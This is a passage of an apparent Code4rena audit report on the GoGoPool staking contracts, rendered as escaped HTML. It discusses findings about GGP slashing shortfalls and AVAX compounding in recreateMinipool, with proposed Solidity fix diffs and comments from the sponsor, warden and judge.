minimum amount of GGP staked is unlikely to bump into this situation unless there is a nosedive of GGP price in AVAX. The deficiency should nonetheless be made up from <code>avaxNodeOpAmt</code> should this unfortunate situation happen.</p>\n<h3 id=\"proof-of-concept-27\" style=\"position:relative;\"><a href=\"#proof-of-concept-27\" aria-label=\"proof of concept 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/multisig-labs/gogopool/blob/9ad393c825e6ac32f3f6c017b4926806a9383df1/contracts/contract/MinipoolManager.sol#L731-L733\">File: MinipoolManager.sol#L731-L733</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span></code></pre>\n<p>As can be seen from the code block above, in extreme and unforeseen cases, the difference between <code>staking.getGGPStake(owner)</code> and <code>slashGGPAmt</code> can be significant. Liquid stakers would typically and ultimately care about how they are going to be adequately compensated with, in AVAX preferably. </p>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider having the affected if block refactored as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tStaking staking = Staking(getContractAddress(&quot;Staking&quot;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tif (staking.getGGPStake(owner) &lt; slashGGPAmt) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\tslashGGPAmt = staking.getGGPStake(owner);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t\t\tuint256 diff = slashGGPAmt - staking.getGGPStake(owner);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t\t\tOracle oracle = Oracle(getContractAddress(&quot;Oracle&quot;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t\t\t(uint256 ggpPriceInAvax, ) = oracle.getGGPPriceInAVAX();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t\t\tuint256 diffInAVAX = diff.mulWadUp(ggpPriceInAvax);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                       staking.decreaseAVAXStake(owner, diffInAVAX);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t\t\tVault vault = Vault(getContractAddress(&quot;Vault&quot;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t\t\tvault.transferAVAX(&quot;ProtocolDAO&quot;, diffInAVAX);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6#issuecomment-1433528943\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>As the warden pointed out, this event is very unlikely.\nI think that it is a reasonable risk for the protocol to take.\nSlashing does not exist in Avalanche, you simply get rewards or do not, so personally, I don’t think slashing their AVAX would be a good solution as it goes against Avalanche practices.\nWill bring it up to the team to see what they think.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6#issuecomment-1433711442\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>The team seems to be in consensus that this is unlikely and that we will not be changing. The proposed solution goes against how Avalanche protocol operates so we believe it would not be an appropriate fix.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6#issuecomment-1433960117\">RaymondFam (warden) commented</a>:</strong></p>\n<blockquote>\n<p>The proposed solution refers to slashing of AVAX in C Chain where this measure is solely at the discretion of the protocol. But I understand the complication entailed in making fixes for incidents that will be rare to occur.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6#issuecomment-1435639671\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I believe the Sponsors opinion to be valid, and that the scenario may be unlikely.</p>\n<p>However, I think the math shows that the system would be taking a loss which may be notable.</p>\n<p>I’m thinking Medium Severity would be appropriate, but a Nofix seems acceptable given the odds (a “risk treasury” could be created to account for this scenario without needing to change the contracts).</p>\n</blockquote>\n<hr>\n<h2 id=\"mrm-03-amountavailableforstaking-not-fully-utilized-with-compoundedavaxnodeopamt-easily-forfeited\" style=\"position:relative;\"><a href=\"#mrm-03-amountavailableforstaking-not-fully-utilized-with-compoundedavaxnodeopamt-easily-forfeited\" aria-label=\"mrm 03 amountavailableforstaking not fully utilized with compoundedavaxnodeopamt easily forfeited permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52\">[MR:M-03] <code>amountAvailableForStaking()</code> not fully utilized with <code>compoundedAvaxNodeOpAmt</code> easily forfeited</a></h2>\n<p><em>Submitted by RaymondFam</em></p>\n<p><a href=\"https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/tokens/TokenggAVAX.sol#L134-L146\">https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/tokens/TokenggAVAX.sol#L134-L146</a><br>\n<a href=\"https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/MinipoolManager.sol#L497-L505\">https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/MinipoolManager.sol#L497-L505</a></p>\n<h3 id=\"original-issue-2\" style=\"position:relative;\"><a href=\"#original-issue-2\" aria-label=\"original issue 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Original Issue</h3>\n<p>M-08: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620\">Recreated pools receive a wrong AVAX amount due to miscalculated compounded liquid staker amount</a></p>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The mitigated step is implemented at the expense of economic loss to both the node operators and the liquid stakers if <code>compoundedAvaxNodeOpAmt &#x3C;= ggAVAX.amountAvailableForStaking()</code>.</p>\n<h3 id=\"proof-of-concept-28\" style=\"position:relative;\"><a href=\"#proof-of-concept-28\" aria-label=\"proof of concept 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here is a typical scenario:</p>\n<ol>\n<li>The protocol now assumes that a 1:1 nodeOp:liqStaker funds ratio is guaranteed to be met because of the atomic transaction that has also been implemented.</li>\n<li>This is deemed an edge case that will only be optimally utilized if <code>compoundedAvaxAmt == ggAVAX.amountAvailableForStaking()</code>.</li>\n<li>The atomic transaction is going to fail if <code>compoundedAvaxAmt > ggAVAX.amountAvailableForStaking()</code> after all due to situations like liquid stakers have been actively calling <a href=\"https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/tokens/TokenggAVAX.sol#L196-L205\"><code>withdrawAVAX()</code></a>.</li>\n</ol>\n<p>Under normal circumstances, <a href=\"https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/tokens/TokenggAVAX.sol#L134-L146\"><code>ggAVAX.amountAvailableForStaking()</code></a> is going to be adequate enough to cater for <code>compoundedAvaxNodeOpAmt</code>. This should not be easily forfeited without first checking whether or not <code>ggAVAX.amountAvailableForStaking()</code> is greater than <code>compoundedAvaxNodeOpAmt</code>.</p>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider implementing the following check in <code>recreateMinipool()</code> to get the best out of it:</p>\n<p><a href=\"https://github.com/multisig-labs/gogopool/blob/3b5ab1d6505ef9be6197c4056acd38d6bed4aff6/contracts/contract/MinipoolManager.sol#L486-L517\">File: MinipoolManager.sol#L486-L517</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\tfunction recreateMinipool(address nodeID) internal whenNotPaused {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tMinipool memory mp = getMinipool(minipoolIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tMinipoolStatus currentStatus = MinipoolStatus(mp.status);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tif (currentStatus != MinipoolStatus.Withdrawable) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\trevert InvalidStateTransition();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                uint256 compoundedAvaxAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                uint256 rewardAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t\tif (mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt &lt;= ggAVAX.amountAvailableForStaking()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        compoundedAvaxAmt = mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        rewardAmt = mp.avaxNodeOpRewardAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        compoundedAvaxAmt = mp.avaxNodeOpAmt + mp.avaxLiquidStakerRewardAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        rewardAmt = mp.avaxLiquidStakerRewardAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t// Compound the avax plus rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t// NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-\t\tuint256 compoundedAvaxAmt = mp.avaxNodeOpAmt + mp.avaxLiquidStakerRewardAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxNodeOpAmt&quot;)), compoundedAvaxAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxLiquidStakerAmt&quot;)), compoundedAvaxAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tStaking staking = Staking(getContractAddress(&quot;Staking&quot;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t// Only increase AVAX stake by rewards amount we are compounding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t// since AVAX stake is only decreased by withdrawMinipool()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-\t\tstaking.increaseAVAXStake(mp.owner, mp.avaxLiquidStakerRewardAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t\tstaking.increaseAVAXStake(mp.owner, rewardAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tstaking.increaseAVAXAssigned(mp.owner, compoundedAvaxAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tif (staking.getRewardsStartTime(mp.owner) == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t// Edge case where calculateAndDistributeRewards has reset their rewards time even though they are still cycling</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t// So we re-set it here to their initial start time for this minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\tstaking.setRewardsStartTime(mp.owner, mp.initialStartTime);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(&quot;ProtocolDAO&quot;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tuint256 ratio = staking.getCollateralizationRatio(mp.owner);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tif (ratio &lt; dao.getMinCollateralizationRatio()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\trevert InsufficientGGPCollateralization();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tresetMinipoolData(minipoolIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.status&quot;)), uint256(MinipoolStatus.Prelaunch));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52#issuecomment-1437348706\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Per full discussion with sponsor and warden <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52#issuecomment-1433722646\">here</a>, I believe we can agree with the validity of the finding but we’re unclear in terms of resolution.</p>\n<p>I’ll give it a second check before awarding, but marking as valid for now.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52#issuecomment-1437502850\">RaymondFam (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Here is one solution I could suggest:</p>\n<p><a href=\"https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/utils/RialtoSimulator.sol\">https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/utils/RialtoSimulator.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    error UnableToProcess();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\tfunction processMinipoolEndWithRewards(address nodeID) public returns (MinipoolManager.Minipool memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t        if (ggAVAX.amountAvailableForStaking() == 0) revert UnableToProcess();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tMinipoolManager.Minipool memory mp = minipoolMgr.getMinipoolByNodeID(nodeID);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tuint256 totalAvax = mp.avaxNodeOpAmt + mp.avaxLiquidStakerAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t// Rialto queries Avalanche node to verify that validation period was successful</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tuint256 rewards = minipoolMgr.getExpectedAVAXRewardsAmt(mp.duration, totalAvax);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t// Send the funds plus rewards back to MinipoolManager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tminipoolMgr.recordStakingEndThenMaybeCycle{value: totalAvax + rewards}(mp.nodeID, block.timestamp, rewards);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tmp = minipoolMgr.getMinipoolByNodeID(mp.nodeID);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\treturn mp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\tfunction processMinipoolEndWithoutRewards(address nodeID) public returns (MinipoolManager.Minipool memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+\t        if (ggAVAX.amountAvailableForStaking() == 0) revert UnableToProcess();\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tMinipoolManager.Minipool memory mp = minipoolMgr.getMinipoolByNodeID(nodeID);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tuint256 totalAvax = mp.avaxNodeOpAmt + mp.avaxLiquidStakerAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tuint256 rewards = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t// Send the funds plus NO rewards back to MinipoolManager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tminipoolMgr.recordStakingEndThenMaybeCycle{value: totalAvax + rewards}(mp.nodeID, block.timestamp, rewards);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tmp = minipoolMgr.getMinipoolByNodeID(mp.nodeID);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\treturn mp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}\t</span></span></span></code></pre>\n<p>The added check ensures the atomic transaction is going to reliably recreate amidst the right pick for the validating amount I recommended earlier in this issue.</p>\n<p>Otherwise, opting for a resolution by using <code>canClaimAndInitiateStaking()</code> is going to be tricky due to the restricting <code>requireValidStateTransition()</code>.</p>\n</blockquote>\n<hr>\n<h2 id=\"mrm-04-there-is-no-way-to-retrieve-the-rewards-from-the-multisigmanager-and-rewards-are-locked-in-the-vault\" style=\"position:relative;\"><a href=\"#mrm-04-there-is-no-way-to-retrieve-the-rewards-from-the-multisigmanager-and-rewards-are-locked-in-the-vault\" aria-label=\"mrm 04 there is no way to retrieve the rewards from the multisigmanager and rewards are locked in the vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46\">[MR:M-04] There is no way to retrieve the rewards from the MultisigManager and rewards are locked in the vault</a></h2>\n<p><em>Submitted by hansfriese, also found by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/8\">ladboy233</a></em></p>\n<h3 id=\"original-issue-3\" style=\"position:relative;\"><a href=\"#original-issue-3\" aria-label=\"original issue 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 